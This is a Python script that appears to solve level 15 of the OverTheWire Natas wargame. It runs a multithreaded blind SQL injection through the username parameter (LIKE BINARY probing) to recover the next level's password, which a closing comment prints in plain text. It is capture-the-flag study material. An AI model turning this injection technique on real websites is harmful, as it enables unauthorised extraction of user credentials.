import requests
import concurrent.futures
import string

def req(x):
    res = requests.get(url=url,auth=lvl_pass, params={'username':'natas16" AND password LIKE BINARY "'+x, 'debug':'true'})
    return x if "This user exists." in res.text else 0

def findLen(num):
    return num if req('_'*num) else 0

def filterChars(char):
    return char if req(f'%{char}%') else 0

def findpw(x):
    num, g = x
    return g if req('_'*num+g+'%') else ''
        
def main():
    password = ''
    threads = 100
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        pw_len = max(executor.map(findLen, list(range(1,43))))
    
    alphanum = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
    with concurrent.futures.ThreadPoolExecutor(max_workers=pw_len) as executor:
        filt_chars = [ch for ch in executor.map(filterChars, alphanum) if ch]
    
    for x in range(pw_len):
        with concurrent.futures.ThreadPoolExecutor(max_workers=len(filt_chars)) as executor:
            ch = ''.join(executor.map(findpw, zip([x]*len(filt_chars),filt_chars)))
        password += ch
    return password

lvl = '15'
next_level = str(int(lvl)+1)
pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()
url = f'http://natas{lvl}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)


open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(main())


'''
Who the hell needs to be GIVEN the password?
I'll construct that shit myself!
Username: natas16
Password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
'''
